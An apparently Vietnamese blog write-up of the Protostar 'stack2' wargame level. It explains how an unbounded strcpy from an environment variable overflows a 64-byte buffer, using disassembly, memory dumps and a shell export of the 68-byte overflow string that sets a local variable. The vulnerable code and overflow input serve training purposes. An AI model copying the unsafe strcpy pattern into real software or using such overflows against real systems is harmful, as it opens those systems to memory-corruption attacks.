---
layout: post
title: stack2
---
stack2 cũng tương tự như stack0 và stack1.
Trong bài này, chúng ta tiếp tục sử dụng phương thức lưu đè vùng bộ nhớ của biến khác bằng hàm `strcpy`.
Source code của stack2 như sau:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Khi disassemble hàm `main`, ta được đoạn chương trình sau:
```asm
0x08048494 <main+0>:    push   ebp
0x08048495 <main+1>:    mov    ebp,esp
0x08048497 <main+3>:    and    esp,0xfffffff0
0x0804849a <main+6>:    sub    esp,0x60
0x0804849d <main+9>:    mov    DWORD PTR [esp],0x80485e0
0x080484a4 <main+16>:   call   0x804837c <getenv@plt>
0x080484a9 <main+21>:   mov    DWORD PTR [esp+0x5c],eax
0x080484ad <main+25>:   cmp    DWORD PTR [esp+0x5c],0x0
0x080484b2 <main+30>:   jne    0x80484c8 <main+52>
0x080484b4 <main+32>:   mov    DWORD PTR [esp+0x4],0x80485e8
0x080484bc <main+40>:   mov    DWORD PTR [esp],0x1
0x080484c3 <main+47>:   call   0x80483bc <errx@plt>
0x080484c8 <main+52>:   mov    DWORD PTR [esp+0x58],0x0
0x080484d0 <main+60>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484d4 <main+64>:   mov    DWORD PTR [esp+0x4],eax
0x080484d8 <main+68>:   lea    eax,[esp+0x18]
0x080484dc <main+72>:   mov    DWORD PTR [esp],eax
0x080484df <main+75>:   call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:   mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:   cmp    eax,0xd0a0d0a
0x080484ed <main+89>:   jne    0x80484fd <main+105>
0x080484ef <main+91>:   mov    DWORD PTR [esp],0x8048618
0x080484f6 <main+98>:   call   0x80483cc <puts@plt>
0x080484fb <main+103>:  jmp    0x8048512 <main+126>
0x080484fd <main+105>:  mov    edx,DWORD PTR [esp+0x58]
0x08048501 <main+109>:  mov    eax,0x8048641
0x08048506 <main+114>:  mov    DWORD PTR [esp+0x4],edx
0x0804850a <main+118>:  mov    DWORD PTR [esp],eax
0x0804850d <main+121>:  call   0x80483ac <printf@plt>
0x08048512 <main+126>:  leave
0x08048513 <main+127>:  ret
```

Biến `variable` lấy giá trị của environment variable có tên `"GREENIE"`.
Sau đó, giá trị này được copy sang cho `buffer` qua hàm `strcpy`.
Rõ ràng, tương tự như 2 bài trước, nếu giá trị của `variable` lớn hơn 64 byte thì khi copy sang `buffer` sẽ bị tràn sang vùng nhớ của biến khác.
Cụ thể, biến `modified` chiếm 4 byte, bắt đầu từ `esp + 0x58`, còn biến `buffer` chiếm 64 byte bộ nhớ từ `esp + 0x18` đến `esp + 0x57`.
`variable` được lưu bắt đầu từ địa chỉ `esp + 0x5c`. Lưu ý, `variable` có dạng pointer, nên giá trị dùng để copy sang `buffer` thật sự nằm ở vùng nhớ có địa chỉ lưu trong `variable`.

Để dễ tưởng tượng, sau đây là 96 byte bộ nhớ bắt đầu từ địa chỉ `esp`, trước khi `variable` nhận giá trị từ environment variable.
Trong ví dụ này, environment variable có giá trị là `"hello"`, tương đương với chuỗi byte `0x68` `0x65` `0x6c` `0x6c` `0x6f`.
Phân biệt theo màu: <span style="color:aqua">buffer</span>, <span style="color:orangered">modified</span>, và <span style="color:yellow">variable</span>.
<pre class="memory">
0xbffff730:     0x080485e0      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff740:     0xb7fd7ff4      0xb7ec6165      <span style="color:aqua">0xbffff758</span>      <span style="color:aqua">0xb7eada75</span>
0xbffff750:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08049748</span>      <span style="color:aqua">0xbffff768</span>      <span style="color:aqua">0x08048358</span>
0xbffff760:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x08049748</span>      <span style="color:aqua">0xbffff798</span>      <span style="color:aqua">0x08048549</span>
0xbffff770:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08048530</span>      <span style="color:aqua">0xbffff798</span>
0xbffff780:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:orangered">0x00000000</span>      <span style="color:yellow">0xbffff9ec</span>
...
<span style="color:yellow">0xbffff9ec</span>:      "hello"
</pre>

<pre class="memory">
0xbffff730:     0xbffff748      0xbffff9ec      0xb7fff8f8      0xb7f0186e
0xbffff740:     0xb7fd7ff4      0xb7ec6165      <span style="color:aqua">0x6c6c6568</span>      <span style="color:aqua">0xb7ea006f</span>
0xbffff750:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08049748</span>      <span style="color:aqua">0xbffff768</span>      <span style="color:aqua">0x08048358</span>
0xbffff760:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x08049748</span>      <span style="color:aqua">0xbffff798</span>      <span style="color:aqua">0x08048549</span>
0xbffff770:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08048530</span>      <span style="color:aqua">0xbffff798</span>
0xbffff780:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:orangered">0x00000000</span>      <span style="color:yellow">0xbffff9ec</span>
...
<span style="color:yellow">0xbffff9ec</span>:     0x6c6c6568      0x4f4c006f      0x4d414e47      0x73753d45
</pre>

Để exploit được chương trình, ta sẽ gán 68 byte giá trị cho environment variable `"GREENIE"` là `"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\x0a\x0d\x0a\x0d"`.
Giá trị của `modified` sẽ được sửa thành `0x0d0a0d0a`.
Sau đây là bộ nhớ sau `strcpy`.
(`esp` có thể thay đổi tùy theo environment variable `"GREENIE"` thay đổi, nhưng các offset từ `esp` để tìm ra đúng biến thì giữ nguyên.)

<pre class="memory">
0xbffff6f0:     0xbffff708      0xbffff9ad      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      <span style="color:aqua">0x41414141</span>      <span style="color:aqua">0x42424242</span>
0xbffff710:     <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>      <span style="color:aqua">0x46464646</span>
0xbffff720:     <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>      <span style="color:aqua">0x32323232</span>
0xbffff730:     <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>      <span style="color:aqua">0x36363636</span>
0xbffff740:     <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x0d0a0d0a</span>      <span style="color:yellow">0xbffff9</span>00
...
<span style="color:yellow">0xbffff9ad</span>:      "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\n\r\n\r"
</pre>

Cũng lưu ý thêm, biến `variable` có 1 byte đầu tiên bị ảnh hưởng do chuỗi nhập vào là kiểu null-terminated.
Giá trị mong đợi của nó là `0xbffff9ad`, thay vì `0xbffff900`.

## Ref
```bash
user@protostar:~$ export GREENIE=$'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\x0a\x0d\x0a\x0d'
user@protostar:~$ stack2
you have correctly modified the variable
```
